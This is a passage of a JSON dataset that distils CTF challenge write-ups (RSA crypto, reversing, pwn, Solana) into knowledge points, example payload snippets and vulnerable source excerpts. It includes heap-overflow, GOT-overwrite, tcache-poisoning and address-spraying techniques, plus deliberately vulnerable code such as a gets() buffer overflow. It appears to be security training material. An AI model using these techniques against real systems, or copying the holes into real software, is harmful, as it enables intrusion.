            "Utilizing SMT solvers like Z3 for cryptographic challenge solutions is a practical approach when dealing with a set of complex mathematical equations. By defining variables and constraints as per the equations provided, one can automate the process of finding viable solutions for variable values. This method is particularly effective for RSA challenges where direct analytical solutions might be non-trivial or too cumbersome to calculate manually. \n   \n   Example payload for Z3 usage:\n   ```python\n   from z3 import *\n   \n   x = Int(\"x\")  \n   y = Int(\"y\")  \n   z = Int(\"z\")\n   \n   s = Solver()\n   \n   # Add constraints derived from the challenge equations\n   s.add(...)\n   \n   if s.check() == sat:\n      m = s.model()\n      x_value = m[x].as_long()\n      y_value = m[y].as_long()\n      z_value = m[z].as_long()\n      # Additional steps to calculate RSA parameters and decrypt the message\n   ```"
        ],
        "key": "```python\np = nextPrime(x**2 + z**2 + y**2 << 76)  \nq = nextPrime(z**2 + y**3 - y*x*z ^ 67)  \nn, e = p * q, 31337  \nm = bytes_to_long(FLAG)  \nc = pow(m, e, n)  \n```"
    },
    {
        "name": "RSASSS",
        "write_up": "dataset/raw/RSASSS.md",
        "type": "crypto",
        "competition": [
            "b01lers/2021",
            "https://ctftime.org/event/1259/tasks/"
        ],
        "score": 493,
        "max_score": 500,
        "difficulty": 0.986,
        "knowledge": [
            "When faced with RSA encryption where the encryption exponent `e` is small and the ciphertext `ct` likely did not wrap around the modulus `N`, a direct approach to obtaining the plaintext is to compute the `e`-th root of `ct`. This method applies when `N` is sufficiently large, and `e` is known to be a small integer, commonly 3. In Python, finding the `e`-th root can be performed using appropriate libraries or by implementing a root-finding function. \n   - Example payload snippet: \n     ```python\n     pt = find_root(ct, e)  \n     decoded_pt = long_to_bytes(pt).decode()\n     ```",
            "RSA challenges where `e` and the totient `\\(\\phi\\)` are not coprime often hint at an alternative approach for decryption by finding a co-prime `lam` (\u03bb) to both, effectively using a modified RSA decryption method. One can calculate `lam` as a reduced form of `\\(\\phi\\)` (e.g., `\\(\\phi // gcd(e, \\phi)\\)` where `gcd` is the greatest common divisor) to use as the totient. After obtaining `lam`, calculate the modular inverse of `e` mod `lam` to find `d`. For RSA encryption systems where direct computation of the decryption exponent `d` is not possible due to the non-coprime nature of `e` and `\\(\\phi\\)`, this method provides a viable decryption technique.\n   - Example payload snippet: \n     ```python\n     lam = phi // gcd(e, phi)  # Assuming gcd function is defined or available\n     d = inverse(e, lam)\n     first_pt = pow(ct, d, N)\n     ```\n\nThese extractions provide generalized solutions applicable to RSA-related CTF challenges, particularly focusing on overcoming encryption with small exponents and handling scenarios where traditional decryption methods are not straightforward due to unusual relationships between `e` and `\\(\\phi\\)`."
        ],
        "key": "```python  \nN =\n97047969232146954924046774696075865737213640317155598548487427318856539382020276352271195838803309131457220036648459752540841036128924236048549721616504194211254524734004891263525843844420125276708561088067354907535207032583787127753999797298443939923156682493665024043791390402297820623248479854569162947726288476231132227245848115115422145148336574070067423431126845531640957633685686645225126825334581913963565723039133863796718136412375397839670960352036239720850084055826265202851425314018360795995897013762969921609482109602561498180630710515820313694959690818241359973185843521836735260581693346819233041430373151  \ne = 3  \nct =\n6008114574778435343952018711942729034975412246009252210018599456513617537698072592002032569492841831205939130493750693989597182551192638274353912519544475581613764788829782577570885595737170709653047941339954488766683093231757625\n\npt1 = find_root(ct, e)  \npt1 = cun.long_to_bytes(pt1).decode()  \nprint(pt1)  \n```\n\n```python  \nd = cun.inverse(e, lam)  \nfirst_pt = pow(ct, d, N)  \n```\n\n```python  \nuns = set()  \ni = 1  \nwhile len(uns) < 128:  \n   un = pow(i, lam, N)  \n   uns.add(un)  \n   i += 1  \n```\n\n```python  \npt2 = None  \npts = [(un * first_pt) % N for un in uns]  \npts = [hex(pt) for pt in pts]  \nfor pt in pts:  \n   if \"0x28322\" in pt:  \n       pt = int(pt, 16)  \n       pt2 = cun.long_to_bytes(pt).decode()  \n       break  \n```\n\n```python  \nimport shamir  \nres = shamir.recover_secret([a, b, c], prime=cun.getPrime(512))  \nprint(cun.long_to_bytes(res).decode())  \n```"
    },
    {
        "name": "RSAyyyy",
        "write_up": "dataset/raw/RSAyyyy.md",
        "type": "crypto",
        "competition": [
            "TU/2018",
            "https://ctftime.org/event/650/tasks/"
        ],
        "score": 358,
        "max_score": 497,
        "difficulty": 0.7203219315895373,
        "knowledge": [
            "When solving RSA challenges, converting a message to its numerical representation involves converting each character to its hexadecimal representation, then concatenating them before converting to an integer. This process is critical for encoding messages according to the RSA encryption standard.  \n**Example Payload**: Given a message \"hello\", the hexadecimal conversion would look something like this in Python:\n   ```python\n   message = \"hello\"\n   message_hex = ''.join([hex(ord(x))[2:] for x in message])\n   message_int = int(message_hex, 16)\n   ```",
            "For calculating the modular multiplicative inverse during RSA decryption or signing, the Extended Euclidean Algorithm can be utilized to find the value of \\(d\\) which satisfies the equation \\(d \\cdot e \\equiv 1 \\mod \\phi(n)\\), where \\(\\phi(n)\\) is Euler's Totient Function of \\(n\\). This process is crucial for finding the private key component in RSA cryptography.  \n**Example Code**:\n   ```python\n   def xgcd(b, a):\n       x0, x1, y0, y1 = 1, 0, 0, 1\n       while a != 0:\n           q, b, a = b // a, a, b % a\n           x0, x1 = x1, x0 - q * x1\n           y0, y1 = y1, y0 - q * y1\n       return b, x0, y0\n   \n   def mulinv(b, n):\n       g, x, _ = xgcd(b, n)\n       if g == 1:\n           return x % n\n   \n   # Example usage:\n   e = 65537\n   phi_n = 11787601483213972800\n   d = mulinv(e, phi_n)\n   print(d)\n   ```"
        ],
        "key": "```python\ndef xgcd(b, a):  \n   x0, x1, y0, y1 = 1, 0, 0, 1  \n   while a != 0:  \n       q, b, a = b // a, a, b % a  \n       x0, x1 = x1, x0 - q * x1  \n       y0, y1 = y1, y0 - q * y1  \n   return  b, x0, y0\n\n# x = mulinv(b) mod n, (x * b) % n == 1  \ndef mulinv(b, n):  \n   g, x, _ = xgcd(b, n)  \n   if g == 1:  \n       return x % n\n\nprint(mulinv(65537, 11787601483213972800))  \n```"
    },
    {
        "name": "rsa_padding",
        "write_up": "dataset/raw/rsa_padding.md",
        "type": "crypto",
        "competition": [
            "N1CTF/2018",
            "https://ctftime.org/event/584/tasks/"
        ],
        "score": 303,
        "max_score": 1000,
        "difficulty": 0.303,
        "knowledge": [
            "When facing a scenario with RSA encryption where the same message is encrypted multiple times with slight modifications (such as added padding), a Franklin-Reiter related message attack can be an effective strategy. This attack leverages the relation between the different encryptions of the slightly altered messages to recover the original message. The specific conditions for this method to work include having at least two ciphertexts that were encrypted under the same RSA modulus (n) and exponent (e), where one message is a known or predictable alteration of the other.",
            "In the context of attacking RSA with known or predictable relationships between messages, converting hashed values (such as SHA-256 hashes of inputs) to integers and using these as paddings for messages prepares the ground for applying the Franklin-Reiter related message attack. This requires calculating GCD (Greatest Common Divisor) on polynomials constructed from the ciphertexts and padding differences, leading to the decryption of the original message without directly attacking RSA's mathematical underpinnings. This approach demonstrates how vulnerabilities in message handling and encryption logic can be exploited without needing to factorize the RSA modulus or break RSA encryption directly.\n\nExample payload to implement a Franklin-Reiter related message attack (based on the provided write-up):\n```python\ndef franklin(n, pad1, pad2, c1, c2):  \n   R.<X> = PolynomialRing(Zmod(n))  \n   f1 = (X + pad1)**3 - c1  \n   f2 = (X + pad2)**3 - c2  \n   return -gcd(f1, f2).coefficients()[0]\n   \npad1 = int(hashlib.sha256(\"input1\").hexdigest(), 16)\npad2 = int(hashlib.sha256(\"input2\").hexdigest(), 16)\nc1 = pow(pad1, 3, n)  # Example of obtaining c1, similar approach for c2 with actual ciphertext values\nc2 = pow(pad2, 3, n)  # Actual implementation would use ciphertexts provided by the challenge\n\nresult = franklin(n, pad1, pad2, c1, c2)\nprint(long_to_bytes(result))  # Assuming long_to_bytes is defined as in the provided write-up\n```\nThis payload exemplifies the approach of using cryptographic weaknesses in handling RSA message encryption, specifically through predictable padding transformations, to recover encrypted messages."
        ],
        "key": "```python\nm = b\"xxxxxxxxxxxxxx\"  \nn = 21727106551797231400330796721401157037131178503238742210927927256416073956351568958100038047053002307191569558524956627892618119799679572039939819410371609015002302388267502253326720505214690802942662248282638776986759094777991439524946955458393011802700815763494042802326575866088840712980094975335414387283865492939790773300256234946983831571957038601270911425008907130353723909371646714722730577923843205527739734035515152341673364211058969041089741946974118237091455770042750971424415176552479618605177552145594339271192853653120859740022742221562438237923294609436512995857399568803043924319953346241964071252941  \ne = 3\n\ndef main():  \n   mm = bytes_to_long(m)  \n   assert pow(mm, e) != pow(mm, e, n)  \n   sys.stdout.write(\"Please give me a padding: \")  \n   padding = input().strip()  \n   padding = int(sha256(padding.encode()).hexdigest(),16)  \n   c = pow(mm+padding, e, n)  \n   print(\"Your Ciphertext is: %s\"%c)\n\nif __name__ == '__main__':  \n   main()  \n```"
    },
    {
        "name": "RSyay!",
        "write_up": "dataset/raw/RSyay!.md",
        "type": "crypto",
        "competition": [
            "ByteBandits/2020",
            "https://ctftime.org/event/1022/tasks/"
        ],
        "score": 396,
        "max_score": 500,
        "difficulty": 0.792,
        "knowledge": [
            "When dealing with RSA encryption challenges where the modulus \\(n\\) is not directly given, but an operation involving the prime factors \\(p\\) and \\(q\\) is provided, Euler's Totient Theorem can be essential for deducing \\(n\\). Specifically, in scenarios where operations are performed modulo a prime \\(m\\) larger than \\(n\\), and \\(m\\) is known, applying the theorem helps in simplifying the equation to isolate \\(n\\). An instrumental part of the simplification process is recognizing that for any number \\(a\\) coprime with \\(m\\), \\(a^{m-1} \\mod m = 1\\), and using this to reduce the expressions provided. This approach can retrieve the modulus \\(n\\) by expressing the given operations in terms of Euler's Totient Theorem, thus facilitating the decryption or encryption of given data using the RSA algorithm.",
            "After recovering the RSA modulus \\(n\\) using mathematical manipulation as described, one can proceed to construct the RSA public key using the recovered modulus and the given public exponent \\(e\\), typically 65537 for many CTF challenges. With the public key reconstructed, data encryption or decryption can be performed according to the challenge's requirements. This method can be particularly useful when the challenge provides a unique equation involving the RSA primes and modulus, and requires participants to encrypt or decrypt given data without directly providing \\(n\\). A practical implementation involves using the PyCrypto or similar library to construct the RSA key and perform the necessary cryptographic operations."
        ],
        "key": "```python  \ndef func(bits):  \n   keys = gen_rsa_key(bits, e=65537)  \n   p = keys.p  \n   q = keys.q  \n   m = getPrime(bits + 1)  \n   x = pow(p, m, m) * pow(q, m, m) + p * pow(q, m, m) + q * pow(p, m, m) + p * q + pow(p, m - 1, m) * pow(q, m - 1, m)  \n   text = os.urandom(32)  \n   print('Plaintext (b64encoded) : ', b64encode(text).decode())  \n   print()  \n   print(hex(x)[2:])  \n   print(hex(m)[2:])  \n   print()  \n   ciphertext = input('Ciphertext (b64encoded) : ')  \n   check(ciphertext)  \n```"
    },
    {
        "name": "RTOoOS",
        "write_up": "dataset/raw/RTOoOS.md",
        "type": "reverse",
        "competition": [
            "DEFCON/2019/Quals",
            "https://ctftime.org/event/762/tasks/"
        ],
        "score": 143,
        "max_score": 201,
        "difficulty": 0.7114427860696517,
        "knowledge": [
            "When exploiting a heap overflow vulnerability in a custom heap implementation, allocating memory chunks sequentially and then causing a controlled overflow can allow for the modification of adjacent memory structures, pointers, or data. This technique can enable the attacker to alter the program's behavior, such as redirecting function pointers to arbitrary code or manipulating data structures to breach security. This approach requires a deep understanding of the heap's layout and the target application's memory management behavior.\n\n   Example scenario: Allocation of several chunks of size `0x200`, followed by an overflow chunk with carefully crafted data to overwrite adjacent memory, can be used to manipulate program behavior or data. An exploit may look like:\n   \n   ```python\n   # Allocating pre-setup chunks\n   for i in xrange(6):\n       export(sh, str(i) * l, str(i))\n   \n   # Triggering overflow to modify adjacent memory or control structure\n   export(sh, 'trigger' * l, 'A' * payload_length + arbitrary_data)\n   ```",
            "In scenarios involving out-of-bounds (OOB) memory access vulnerabilities, leveraging the predictable or constant offset between controlled memory regions and critical program structures (like the Global Offset Table (GOT) or other key variables) can enable arbitrary code execution, information disclosure, or manipulation of program logic. This often involves crafting inputs that exploit the OOB read/write to leak addresses or overwrite pointers or function addresses.\n\n   Example scenario: An attacker finds that the offset between a writable buffer (`vm_mem`) and a critical program structure (`strcasestr_got`) is constant or predictable. They can leverage an OOB write to change the `strcasestr` GOT entry to point to a gadget or function (`atoi`) that behaves beneficially for attack progression.\n\n   ```assembly\n   ; Example assembly for rewriting GOT via OOB write\n   mov rdi,atoi_got       ; Load address of atoi GOT entry into RDI\n   xor rax,rax            ; Clear RAX register\n   mov al,0x76            ; Set AL with the opcode for desired syscalls or actions\n   call rax               ; Execute syscall/action modifying GOT\n   ```"
        ],
        "key": "```c\nif ( !memcmp(\"export \", cmd, v9) )  \n{  \n export_key = (char *)&cmd[(signed int)strlen(\"export \")];  \n export_val = 0LL;  \n for ( i = 0; i < (signed int)strlen(export_key); ++i )  \n {  \n   if ( export_key[i] == '=' )  \n   {  \n     export_val = &export_key[i + 1];  \n     export_key[i] = 0;  \n     break;  \n   }  \n }  \n for ( j = 0; j < 16; ++j )  \n {  \n   v32 = 0;  \n   if ( (unsigned int)strlen((char *)(((signed __int64)j << 9) + 0x1650))  \n     && !strcmp((unsigned __int8 *)(((signed __int64)j << 9) + 0x1650), (unsigned __int8 *)export_key) )  \n   {                                   // there is currently the same key  \n     v10 = len - (unsigned __int64)strlen(export_key);  \n     len = v10 - (unsigned __int64)strlen(\"export\");  \n     for ( k = 0; k < len; values[j][v32++] = export_val[k++] )  \n     {  \n       if ( export_val[k] == '$' )  \n       {  \n         for ( l = 0; l < 16; ++l )  \n         {  \n           v11 = strlen((char *)(((signed __int64)l << 9) + 0x1650));  \n           if ( !memcmp(  \n                   (unsigned __int8 *)&export_val[k + 1],  \n                   (unsigned __int8 *)(((signed __int64)l << 9) + 0x1650),  \n                   v11) )  \n           {  \n             for ( m = 0; m < (signed int)strlen(values[l]); ++m )  \n             {  \n               v12 = v32++;  \n               values[j][v12] = values[l][m];  \n             }  \n             k += strlen(values[l]);   // value? should it be key?  \n             break;  \n           }                           // might be vulnerable here  \n         }  \n       }  \n     }  \n   }  \n }  \n v28 = 0;  \n for ( n = 0; n < 16; ++n )  \n {  \n   if ( !(unsigned int)strlen((char *)(((signed __int64)n << 9) + 0x1650)) )  \n   {  \n     v13 = strlen(export_key);  \n     memcpy((char *)(((signed __int64)n << 9) + 0x1650), export_key, v13);  \n     v14 = 512 - (unsigned __int64)strlen(export_key);  \n     v15 = strlen(\"export \");  \n     values[n] = (char *)malloc(v14 - v15 + 1);// no 0 checking  \n     v16 = 512 - (unsigned __int64)strlen(export_key);  \n     lena = v16 - (unsigned __int64)strlen(\"export \");  \n     for ( ii = 0; ii < lena; values[n][v28++] = export_val[ii++] )  \n     {  \n       if ( export_val[ii] == '$' )  \n       {  \n         for ( jj = 0; jj < 16; ++jj )  \n         {  \n           v17 = strlen((char *)(((signed __int64)jj << 9) + 0x1650));  \n           if ( !memcmp(  \n                   (unsigned __int8 *)&export_val[ii + 1],  \n                   (unsigned __int8 *)(((signed __int64)jj << 9) + 0x1650),  \n                   v17) )  \n           {  \n             for ( kk = 0; kk < (signed int)strlen(values[jj]); ++kk )  \n             {  \n               v18 = v28++;  \n               values[n][v18] = values[jj][kk];// certainly overflow  \n             }  \n             ii += strlen(values[jj]);  \n             break;  \n           }  \n         }  \n       }  \n     }  \n     return 0;  \n   }  \n }  \n}\n```"
    },
    {
        "name": "Run Run Run!",
        "write_up": "dataset/raw/Run Run Run!.md",
        "type": "reverse",
        "competition": [
            "HITCON/2020",
            "https://ctftime.org/event/1136/tasks/"
        ],
        "score": 315,
        "max_score": 384,
        "difficulty": 0.8203125,
        "knowledge": [
            "When working with shellcode in constrained environments where specific registers or memory spaces must be interacted with, leveraging the architectural features of the system, such as the unused upper bytes of the AVX YMM registers in x86_64, can provide a method to temporarily store and retrieve values across operations that would normally clear such data. This could be particularly useful for bypassing specific restrictions or maintaining state across restricted operations.  \nExample payload segment: `vmovups ymm0, yword [rax] ; move data into ymm0` followed later by `vmovups yword [rax], ymm0 ; restore data from ymm0`",
            "For challenges involving binary analysis or reverse engineering where the source code is not directly available, utilizing available tools like disassemblers or interpreters specific to the platform, or even developing custom scripts to parse and understand the binary's behavior, proves crucial for extracting algorithms or logic. This process can include analyzing virtual machine bytecode to understand high-level functionality without the original code.  \nExample strategy: Utilize a combination of tools like ciqdb for Garmin Connect IQ applications and custom disassembly scripts to analyze proprietary binary formats."
        ],
        "key": "```C\n while ( 1 ) {  \n  \n   if (ptrace(PTRACE_SINGLESTEP, pid, 0, 0))   // Step a single instruction  \n     err(1, \"ptrace\");  \n  \n   waitForPID = wait(&stat_loc);               // Wait for the instruction  \n   if (!(stat_loc & 0x7F))  \n     break;  \n  \n   isChildDead = (stat_loc >> 8) & 0xFF;  \n   if (isChildDead != 5)                       // Stop if the shellcode died  \n     errorMessage(\"Child dead unexpectedly.\");  \n  \n   if (stepCounter > 0xFFF)                    // Only do 0xFFF steps  \n     errorMessage(\"Too many steps.\");  \n  \n   if (shellcodeReached != 1 && getRIP() == 0xDEAD0080) { // Start of\nshellcode  \n  \n     shellcodeReached = 1;  \n     nop();  \n     resetState();                             // Reset all registers  \n     nullMemory();                             // Zero the 0x2170000 memory page  \n     writeCookie();                            // Write a random 8 byte cookie to 0x2170000  \n  \n   }  \n   if (shellcodeReached) {                     // In the actual shellcode\ndon't execute  \n                                               // syscalls  \n     if (waitForExitSyscall())   {             // Skip all syscalls  \n                                               // Exit on a exit syscall  \n       doesExit = 1;                           // Stop the execution  \n       break;  \n  \n     }  \n     currentStep = stepCounter++;  \n     RIPArray[currentStep] = getCurrentRIP();  // Save the instruction pointer  \n                                               // of each executed instruction  \n   }  \n  \n }  \n```\n\n```C\nvoid timemachine() {\n\n int wstatus;  \n int curStep;  \n pid_t waitForPID;  \n int isChildDead;  \n user_regs_struct regs;\n\n resetState(); // Reset registers  \n  \n for ( curStep = stepCounter - 1; curStep >= 0; curStep-- ) { // Iterate\nbackwards to travel back in time  \n  \n   if (ptrace(PTRACE_GETREGS, pid, 0, &regs)) // Read the current register\nstate  \n     err(1, \"ptrace\");  \n  \n   regs.rip = RIPArray[curStep];  // Set instruction pointer to saved one  \n  \n   if (ptrace(PTRACE_SETREGS, pid, 0, &regs)) // Write the changed register  \n     err(1, \"ptrace\");  \n  \n   if (ptrace(PTRACE_SINGLESTEP, pid, 0, 0)) // Step a instruction  \n     err(1, \"ptrace\");  \n  \n   waitForPID = wait(&wstatus); // Wait for it to be executed  \n  \n   // Handle unexpected death of the shellcode  \n   if (!(stat_loc & 0x7F)) {  \n     puts(\"exit too early..\");  \n     exit(1);  \n   }  \n   isChildDead = (stat_loc >> 8) & 0xFF;  \n   if (isChildDead != 5)  \n     errorMessage(\"Child dead..\");  \n  \n }  \n  \n}  \n```\n\n```C\nvoid resetState() {\n\n user_regs_struct userRegs;  \n user_fpregs_struct userFloatRegs;\n\n memset(&userRegs, 0, sizeof(userRegs)); // zero the register state  \n userRegs.rip = 0xDEAD0080;              // set the instruction pointer to\n0xDEAD0080  \n userRegs.cs = 0x33;                     // sets the code segment to 0x33 ->\n64bit code segment  \nuserRegs.ss = 0x2B;                     // sets the stack segment to 0x2B ->\n64bit data segment  \n  \n if (ptrace(PTRACE_SETREGS, pid, 0, &userRegs)) // reset the user registers  \n   err(1, \"ptrace\");  \n  \n memset(&userFloatRegs, 0, sizeof(userFloatRegs)); // zero the floating point\nregister state  \n  \n if (ptrace(PTRACE_SETFPREGS, pid, 0, &userFloatRegs)) // reset the floating\npoint registers  \n   err(1, \"ptrace\");  \n  \n}  \n```\n\n```C\nstruct user_fpregs_struct  \n{  \n __uint16_t                cwd;  \n __uint16_t                swd;  \n __uint16_t                ftw;  \n __uint16_t                fop;  \n __uint64_t                rip;  \n __uint64_t                rdp;  \n __uint32_t                mxcsr;  \n __uint32_t                mxcr_mask;  \n __uint32_t                st_space[32];   /* 8*16 bytes for each FP-reg = 128\nbytes */  \n __uint32_t                xmm_space[64];  /* 16*16 bytes for each XMM-reg =\n256 bytes */  \n __uint32_t                padding[24];  \n};  \n```"
    },
    {
        "name": "rusty_shop",
        "write_up": "dataset/raw/rusty_shop.md",
        "type": "pwn",
        "competition": [
            "FacebookCTF/2019",
            "https://ctftime.org/event/781/tasks/"
        ],
        "score": 983,
        "max_score": 1000,
        "difficulty": 0.983,
        "knowledge": [
            "When exploiting buffer overflow vulnerabilities involving a numerical calculation of overflow size, precision is crucial to ensure the payload is executed as intended. In cases where the initial payload does not achieve the expected outcome, iterating through different values by incrementing the overflow size (as represented by `NUM_REPEATS` in the provided script) can lead to success. This method is particularly useful when the script's reliability is in question or when debugging information indicates that execution is near the threshold of triggering the vulnerability.",
            "In scenarios where direct memory manipulation is possible but precise control of the overwritten memory is challenging, \"spraying\" a desired address (such as a function pointer to a \"win\" function) across a wide memory range increases the likelihood that the address will be hit and executed. This technique is exemplified by sending a large number of items (`NUM_REPEATS`) containing the address (`WIN_PTR`) to overwrite. It is a practical approach to exploit vulnerabilities in environments where the memory layout is either partially controllable or predictable to some extent.\n\nExample payload snippet for address spraying:\n```python\nr.sendlineafter(\"Name: \",p64(WIN_PTR))\nr.sendlineafter(\"Count: \",str(NUM_REPEATS))\n```"
        ],
        "key": "```c\n#include <stdio.h>\n#include <string.h>\n\nvoid vulnerable_function() {\n    char buffer[64];\n    printf(\"Enter some text: \");\n    gets(buffer); // Vulnerable to buffer overflow\n    printf(\"You entered: %s\\n\", buffer);\n}\n\nint main() {\n    vulnerable_function();\n    return 0;\n}\n```"
    },
    {
        "name": "S2DH",
        "write_up": "dataset/raw/S2DH.md",
        "type": "crypto",
        "competition": [
            "RCTF/2022",
            "https://ctftime.org/event/1806/tasks/"
        ],
        "score": 769,
        "max_score": 769,
        "difficulty": 1.0,
        "knowledge": [
            "When facing challenges based on the SIDH protocol, the application of the Castryck-Decru Attack can be an effective strategy, especially when recent vulnerabilities have been discovered in the protocol. This attack enables the efficient recovery of the shared secret from the intercepted public parameters. Adjustments may be required to match the specific elliptic curve used in the challenge. For instance, if the starting curve in the provided code differs from the one in the attack's implementation, it's necessary to align them by modifying the curve equation or using automorphisms to generate the needed endomorphisms.",
            "When computing isogenies in cryptographic algorithms, especially in challenges involving key exchange protocols like SIDH, performance issues can occur due to the intensive computations required. To mitigate these performance issues, specifying the `algorithm=\"factored\"` parameter can substantially speed up the process. This approach is particularly useful in CTF challenges where execution time is critical for exploiting vulnerabilities or extracting encrypted information. \n\nExample of performance optimization in sage code:\n```python\nE.isogeny(R, algorithm=\"factored\")\n```"
        ],
        "key": "```python  \nSb = randint(0, 3^b-1)  \nTb = randint(0, 3^b-1)  \nR = Sb * Pb + Tb * Qb  \npsi = E.isogeny(R)  \nEb, psiPa, psiQa = psi.codomain(), psi(Pa), psi(Qa)  \nEb, psiPa, psiQa\n\nSa = randint(0, 2^a-1)  \nTa = randint(0, 2^a-1)  \nR = Sa*Pa + Ta * Qa  \nphi = E.isogeny(R)  \nEa, phiPb, phiQb = phi.codomain(), phi(Pb), phi(Qb)  \nEa, phiPb, phiQb  \n```"
    },
    {
        "name": "safe vector",
        "write_up": "dataset/raw/safe vector.md",
        "type": "pwn",
        "competition": [
            "zer0pts/2021",
            "https://ctftime.org/event/1256/tasks/"
        ],
        "score": 158,
        "max_score": 392,
        "difficulty": 0.4030612244897959,
        "knowledge": [
            "When a class or object operation allows for negative indexing, it can lead to out-of-bounds access, which can be exploited for arbitrary memory read or write. This vulnerability arises due to failure in properly validating input index values, especially in languages or environments with manual memory management like C++.  \n   Scenario: Accessing elements of a custom vector-like class which implements its own boundary check mechanism that does not account for negative indexes.  \n   Example payload: Access the -1 index to manipulate or read memory located before the intended data structure.",
            "Tcache poisoning can be used as an exploitation technique to perform arbitrary code execution by corrupting the tcache linked list. By carefully crafting heap layout and exploiting vulnerabilities like out-of-bounds write, an attacker can overwrite pointers in the tcache freelist to arbitrary locations, such as `__free_hook`, and redirect execution flow, for instance, to the `system` function.  \n   Scenario: Exploiting a scenario where the version of libc and the binary\u2019s memory management behaviors are known, thereby leveraging the detailed understanding of heap management (like tcache bins size and behavior) to craft the attack.  \n   Example payload: Utilizing out-of-bounds write to insert a fake chunk into the tcache list that points to `__free_hook` and then triggering an allocation to overwrite `__free_hook` with the address of `system`."
        ],
        "key": "```cpp\ntemplate<typename T>  \nclass safe_vector: public std::vector<T> {  \npublic:  \n void wipe() {  \n   std::vector<T>::resize(0);  \n   std::vector<T>::shrink_to_fit();  \n }\n\n T& operator[](int index) {  \n   int size = std::vector<T>::size();  \n   if (size == 0) {  \n     throw \"index out of bounds\";  \n   }  \n   return std::vector<T>::operator[](index % size);  \n }  \n};\n```"
    },
    {
        "name": "safepy",
        "write_up": "dataset/raw/safepy.md",
        "type": "pwn",
        "competition": [
            "UIUCTF/2022",
            "https://ctftime.org/event/1600/tasks/"
        ],
        "score": -1,
        "max_score": -1,
        "difficulty": -1,
        "knowledge": [
            "When dealing with challenges involving code execution via parsing functions, scrutinize the documentation for optional parameters that change the function's behavior. For instance, the `parse_expr` function in SymPy has an optional `evaluate` parameter that, when enabled (default behavior), simplifies expressions, potentially leading to unsafe `eval()` calls. This knowledge can be critical in identifying vulnerabilities where input can be executed or manipulated unexpectedly.\n   - Example payload for executing arbitrary code (printing contents of a file): `print(open(\"/path/to/file\").read())`",
            "Be cautious with security advice found on online forums such as StackOverflow. Even recommended safe practices, like using `parse_expr` instead of `sympify` to avoid the direct risks associated with `eval()`, can be flawed. Always verify the security implications of using certain functions, especially when they process user input, as they may have vulnerabilities that are not immediately obvious from community advice.\n   - No specific payload is provided for this point, but it emphasizes the importance of validating the safety of functions used in parsing or evaluating user input."
        ],
        "key": "```python\nfrom sympy import *\n\ndef parse(expr):  \n   # learned from our mistake... let's be safe now  \n   # https://stackoverflow.com/questions/33606667/from-string-to-sympy-\nexpression  \n   # return sympify(expr)\n\n   # https://docs.sympy.org/latest/modules/parsing.html  \n   return parse_expr(expr)\n\nprint('Welcome to the derivative (with respect to x) solver!')  \nuser_input = input('Your expression: ')  \nexpr = parse(user_input)  \nderiv = diff(expr, Symbol('x'))  \nprint('The derivative of your expression is:')  \nprint(deriv)\n```"
    },
    {
        "name": "Sailors Revenge",
        "write_up": "dataset/raw/Sailors Revenge.md",
        "type": "This is a crypto challenge.",
        "competition": [
            "angstrom/2023",
            "https://ctftime.org/event/1859/tasks/"
        ],
        "score": -1,
        "max_score": 140,
        "difficulty": -1,
        "knowledge": [
            "In Solana smart contracts, particularly involving account validation and custom struct handling, it's crucial to validate the account data's correct structure explicitly. This includes ensuring that an account expected to contain certain type data (like `SailorUnion`) is not inadvertently interpreted as another struct type (such as `Registration`). This vulnerability arises due to Rust's type system not enforcing these checks at the Solana framework level, allowing for exploits like type confusion where negative values in one struct (`Registration { balance: i64 }`) can overflow when improperly cast to an unsigned integer in another context (`SailorUnion { available_funds: u64 }`), leading to unintended high values.",
            "When implementing Solana smart contracts with multi-role functionality, it's essential to correctly enforce role-based checks, especially on transaction signers. In scenarios where a contract method should differentiate roles (e.g., `authority` and `member`), ensuring that each role is not only present but also correctly authorized (e.g., by signing the transaction) prevents unauthorized access or unintended actions. This is especially vital in financial transactions or sensitive operations, where a mistake in these checks could lead to unauthorized asset transfer or manipulation. Here, the lack of stringent checks allowed the same account to act in multiple roles, undermining the intended security model."
        ],
        "key": "```rust\npub fn strike_pay(program_id: &Pubkey, accounts: &[AccountInfo], amt: u64) -> ProgramResult {  \n   msg!(\"strike pay {}\", amt);\n\n   let iter = &mut accounts.iter();\n\n   let sailor_union = next_account_info(iter)?;  \n   assert!(!sailor_union.is_signer);  \n   assert!(sailor_union.is_writable);  \n   assert!(sailor_union.owner == program_id);\n\n   let member = next_account_info(iter)?;  \n   assert!(member.is_writable);  \n   assert!(member.owner == &system_program::ID);\n\n   let authority = next_account_info(iter)?;  \n   assert!(authority.is_signer);  \n   assert!(authority.owner == &system_program::ID);\n\n   let (vault_addr, vault_bump) = Pubkey::find_program_address(&[b\"vault\"], program_id);  \n   let vault = next_account_info(iter)?;  \n   assert!(!vault.is_signer);  \n   assert!(vault.is_writable);  \n   assert!(vault.owner == &system_program::ID);  \n   assert!(vault.key == &vault_addr);\n\n   let system = next_account_info(iter)?;  \n   assert!(system.key == &system_program::ID);\n\n   let mut data = SailorUnion::try_from_slice(&sailor_union.data.borrow())?;  \n   assert!(&data.authority == authority.key.as_ref());\n\n   if data.available_funds >= amt {  \n       data.available_funds -= amt;  \n       transfer(&vault, &member, amt, &[&[b\"vault\", &[vault_bump]]])?;  \n       data.serialize(&mut &mut *sailor_union.data.borrow_mut())?;  \n       Ok(())  \n   } else {  \n       msg!(  \n           \"insufficient funds, have {} but need {}\",  \n           data.available_funds,  \n           amt  \n       );  \n       Err(ProgramError::InsufficientFunds)  \n   }  \n}\n```"
    },
    {
        "name": "Sakura",
        "write_up": "dataset/raw/Sakura.md",
        "type": "web",
        "competition": [
            "HITCON/2017/Quals",
            "https://ctftime.org/event/485/tasks/"
        ],
        "score": 218,
        "max_score": 450,
        "difficulty": 0.48444444444444446,
        "knowledge": [
            "In reverse engineering challenges requiring interaction with a complex verification function that doesn\u2019t instantly fail upon incorrect input, using Symbolic Execution frameworks like `angr`, the `avoid` parameter in the `explore()` method is crucial. This parameter allows specifying memory addresses that, if reached, should cause `angr` to terminate the analysis of the current path. This approach helps in avoiding dead paths that are not leading to a solution, thereby optimizing the search process for valid inputs.",
